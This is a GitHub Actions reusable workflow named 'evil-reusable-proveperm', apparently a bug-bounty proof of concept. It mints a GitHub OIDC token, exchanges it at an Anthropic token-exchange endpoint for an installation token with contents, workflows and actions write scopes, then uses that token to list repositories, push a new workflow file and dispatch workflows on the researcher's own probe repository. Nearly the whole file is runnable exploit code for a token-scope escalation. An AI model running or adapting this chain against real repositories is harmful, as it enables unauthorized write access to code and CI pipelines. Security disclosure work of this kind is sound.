name: evil-reusable-proveperm

on:
  workflow_call:

permissions:
  id-token: write
  contents: read

jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: Mint install token + USE its workflows:write capability
        run: |
          set +e
          AUD="claude-code-github-action"
          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
          TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
          echo "::add-mask::$TOK"

          # Request install token with workflows:write + contents:write + actions:write
          curl -sk -o /tmp/r.json -w 'HTTP %{http_code}\n' \
            -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
            -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
            -d '{"permissions":{"contents":"write","workflows":"write","actions":"write"}}'
          INSTALL=$(jq -r '.token // empty' /tmp/r.json)
          if [ -z "$INSTALL" ]; then
            echo "NO_INSTALL_TOKEN"; jq . /tmp/r.json; exit 0
          fi
          echo "::add-mask::$INSTALL"
          echo "INSTALL_TOKEN_OK expires=$(jq -r .expires_at /tmp/r.json)"

          # Test 1: GET /installation/repositories
          echo "--- TEST 1: list installation repos"
          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/installation/repositories?per_page=5" -w '\nHTTP %{http_code}\n' \
            | jq '{repo:.repositories[0].full_name}'

          # Test 2: actions:write — list workflow runs (works with actions:read; if returned, it's at least read)
          echo "--- TEST 2: GET workflow runs (needs actions:read)"
          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/runs?per_page=1" -w '\nHTTP %{http_code}\n' \
            | jq '{total_count, latest_run_id: .workflow_runs[0].id}'

          # Test 3: workflows:write — try to write a workflow file via contents API
          # Create a new workflow file in a TEST BRANCH (do not touch main; only attacker's workflow proves writes)
          echo "--- TEST 3: workflows:write — push new workflow to branch"
          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
            -X PUT "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/contents/.github/workflows/POC_install_token_$(date +%s).yml" \
            -d "$(jq -n --arg b "$(base64 -w0 <<<'name: poc
on: workflow_dispatch
jobs:
  noop:
    runs-on: ubuntu-latest
    steps:
      - run: echo "POC install_token workflows:write worked"')" \
              '{message:"PoC: install_token workflows:write", content:$b, branch:"perm-poc"}')" \
            -w '\nHTTP %{http_code}\n' | jq '{file:.content.html_url, commit:.commit.sha, msg:.message}'

          # Test 4: actions:write — try to dispatch the new workflow
          echo "--- TEST 4: actions:write — dispatch existing workflow"
          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
            -X POST "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/workflows/probe.yml/dispatches" \
            -d '{"ref":"main","inputs":{"audience":"claude-code-github-action","permissions_json":"{\"contents\":\"read\"}"}}' \
            -w '\nHTTP %{http_code}\n'

          # Test 5: actions:write — cancel an old workflow run (less destructive than re-run)
          # Use the run from test 2
          echo "--- TEST 5: actions:write — try to delete a run"
          OLD_RUN=$(curl -sk -H "Authorization: Bearer $INSTALL" "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/runs?per_page=1" | jq -r '.workflow_runs[0].id')
          echo "would-delete run id: $OLD_RUN (not actually deleting to avoid noise)"
